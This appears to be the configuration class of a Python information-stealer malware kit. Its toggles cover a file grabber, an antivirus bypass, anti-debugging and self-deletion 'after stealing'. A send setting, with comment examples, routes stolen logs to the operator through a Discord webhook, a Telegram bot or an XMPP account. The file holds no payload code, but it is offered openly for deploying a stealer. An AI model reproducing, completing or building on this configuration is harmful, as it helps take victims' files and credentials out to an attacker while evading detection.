class config:
    enableFileGrabber = False #enable file grabber
    oneStart = False #enable this if you want logs to come only from unique computers
    avbypass = False #enable antiviruses bypass
    selfDestruct = False #deletes itself after stealing
    debuging = False #disable AntiDebug (do not change if you do not know what it is responsible for)

    sendData = [0,"","",""]# You can write your address for sending logs here

    #example for Discord [0, "url of your WebHook", "name of that WebHook","null"]
    #example for Telegram [1, "HTTPAPI that you got from botFather", "your chat ID","null"]
    #example for XMPP/Jabber [2, "jabberid", "jabberpassword", "jabberreceiver"]